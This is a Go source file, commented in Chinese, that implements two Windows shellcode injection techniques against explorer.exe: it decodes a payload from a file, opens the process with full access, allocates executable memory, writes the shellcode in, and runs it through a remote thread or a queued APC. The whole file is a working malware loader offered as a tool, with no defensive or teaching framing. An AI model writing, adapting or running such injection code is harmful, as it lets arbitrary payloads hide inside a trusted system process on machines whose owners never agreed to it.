package tools

import (
	"fmt"
	"golang.org/x/sys/windows"
	"os"
	"syscall"
	"unsafe"
)

// 获取pid句柄
func getProcessHandleByName(processName string) (windows.Handle, error) {
	var processSnap windows.Handle
	var pe32 windows.ProcessEntry32
	pe32.Size = uint32(unsafe.Sizeof(pe32))

	processSnap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, err
	}
	defer windows.CloseHandle(processSnap)

	if err := windows.Process32First(processSnap, &pe32); err != nil {
		return 0, err
	}

	for {
		currentProcessName := syscall.UTF16ToString(pe32.ExeFile[:])
		if currentProcessName == processName {
			return windows.OpenProcess(windows.PROCESS_ALL_ACCESS, false, pe32.ProcessID)
		}
		if err := windows.Process32Next(processSnap, &pe32); err != nil {
			return 0, err
		}
	}
}

// 获取pid号
func getProcessIdByName(processName string) (uint32, error) {
	var processSnap windows.Handle
	var pe32 windows.ProcessEntry32
	pe32.Size = uint32(unsafe.Sizeof(pe32))

	processSnap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, err
	}
	defer windows.CloseHandle(processSnap)

	if err := windows.Process32First(processSnap, &pe32); err != nil {
		return 0, err
	}

	for {
		currentProcessName := syscall.UTF16ToString(pe32.ExeFile[:])
		if currentProcessName == processName {
			return pe32.ProcessID, nil
		}
		if err := windows.Process32Next(processSnap, &pe32); err != nil {
			return 0, err
		}
	}
}

// 进程地址上分配内存
func allocateMemoryInProcess(hProcess windows.Handle, shellcode []byte) (uintptr, error) {
	size := uint32(len(shellcode))

	kernel32Handle, err := windows.LoadLibrary("kernel32.dll")
	if err != nil {
	}
	defer windows.FreeLibrary(kernel32Handle)

	virtualAllocExAddr, err := windows.GetProcAddress(kernel32Handle, "VirtualAllocEx")
	if err != nil {
	}
	lpBaseAddress, _, err := syscall.SyscallN(virtualAllocExAddr,
		uintptr(hProcess),
		0,
		uintptr(size),
		uintptr(windows.MEM_RESERVE|windows.MEM_COMMIT),
		uintptr(windows.PAGE_EXECUTE_READWRITE))
	return lpBaseAddress, err
}

// 写入shellcode
func writeShellcodeToProcessMemory(hProcess windows.Handle, lpBaseAddress uintptr, shellcode []byte) error {
	kernel32Handle, err := windows.LoadLibrary("kernel32.dll")
	if err != nil {
		return err
	}
	defer windows.FreeLibrary(kernel32Handle)

	writeProcessMemoryAddr, err := windows.GetProcAddress(kernel32Handle, "WriteProcessMemory")
	if err != nil {
		return err
	}

	_, _, err = syscall.SyscallN(writeProcessMemoryAddr,
		uintptr(hProcess),
		lpBaseAddress,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		0)
	return err
}

// 通过pid获取所有线程
func getAllThreadIdByProcessId(processID uint32) (uint32, error) {
	//bufferLength := uint32(1000)
	var te32 windows.ThreadEntry32
	te32.Size = uint32(unsafe.Sizeof(te32))

	hSnapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if err != nil {
		return 0, err
	}
	defer windows.CloseHandle(hSnapshot)

	if err := windows.Thread32First(hSnapshot, &te32); err != nil {
		return 0, err
	}

	for {
		if te32.OwnerProcessID == processID {
			return te32.ThreadID, nil
		}
		if err := windows.Thread32Next(hSnapshot, &te32); err != nil {
			return 0, err
		}
	}
}

// 线程执行
func createRemoteThreadToExecute(hProcess windows.Handle, lpBaseAddress uintptr) error {
	kernel32Handle, err := windows.LoadLibrary("kernel32.dll")
	if err != nil {
		return err
	}
	defer windows.FreeLibrary(kernel32Handle)

	createRemoteThreadAddr, err := windows.GetProcAddress(kernel32Handle, "CreateRemoteThread")
	if err != nil {
		return err
	}

	_, _, err = syscall.SyscallN(createRemoteThreadAddr,
		uintptr(hProcess),
		0,
		0,
		lpBaseAddress,
		0,
		0,
		0)
	return err
}

// 插入apc
func setupAPC(lpBaseAddress uintptr, hThread windows.Handle) error {
	kernel32Handle, err := windows.LoadLibrary("kernel32.dll")
	if err != nil {
		return err
	}
	defer windows.FreeLibrary(kernel32Handle)

	queueUserAPCAddr, err := windows.GetProcAddress(kernel32Handle, "QueueUserAPC")
	if err != nil {
		return err
	}

	_, _, err = syscall.SyscallN(queueUserAPCAddr,
		uintptr(lpBaseAddress),
		uintptr(hThread),
		0)
	return err
}

// 寻找pid 然后打开进程 申请空间后注入 最后通过新线程执行
func DirectShellcodeInject(fp string) error {
	encodeDataByte, err := os.ReadFile(fp)
	if err != nil {
		fmt.Printf("读取文件时出错: %v\n", err)
	}
	shellcode := Decode(encodeDataByte)
	// 获取notepad.exe进程句柄
	hProcess, err := getProcessHandleByName("explorer.exe")
	defer windows.CloseHandle(hProcess)

	// 在目标进程中分配内存
	lpBaseAddress, err := allocateMemoryInProcess(hProcess, shellcode)

	//if err != nil {
	//	return err
	//}

	// 向目标进程内存写入shellcode
	err = writeShellcodeToProcessMemory(hProcess, lpBaseAddress, shellcode)
	//if err != nil {
	//	return err
	//}

	// 创建远程线程来执行注入的代码
	err = createRemoteThreadToExecute(hProcess, lpBaseAddress)
	//if err != nil {
	//	return err
	//}

	return nil
}

// 前面同理 执行是依靠找到一个线程句柄后插入apc队列
func ApcShellcodeInject(fp string) error {
	encodeDataByte, err := os.ReadFile(fp)
	if err != nil {
		fmt.Printf("读取文件时出错: %v\n", err)
	}
	shellcode := Decode(encodeDataByte)
	var hProcess windows.Handle
	var hThread windows.Handle
	var processID uint32
	var threadID uint32

	// 获取explorer.exe进程ID
	processID, err = getProcessIdByName("explorer.exe")
	if err != nil {
		return err
	}

	// 获取explorer.exe进程句柄
	hProcess, _ = getProcessHandleByName("explorer.exe")

	defer windows.CloseHandle(hProcess)

	// 在目标进程中分配内存
	lpBaseAddress, _ := allocateMemoryInProcess(hProcess, shellcode)

	// 向目标进程内存写入shellcode
	_ = writeShellcodeToProcessMemory(hProcess, lpBaseAddress, shellcode)

	// 获取目标进程的一个线程ID
	threadID, _ = getAllThreadIdByProcessId(processID)

	// 获取目标进程的线程句柄 0x001F03FF指的是THREAD_ALL_ACCESS 常量
	hThread, _ = windows.OpenThread(0x001F03FF, false, threadID)
	fmt.Println(hThread)
	defer windows.CloseHandle(hThread)

	// 设置异步过程调用（APC）
	err = setupAPC(lpBaseAddress, hThread)

	return nil
}
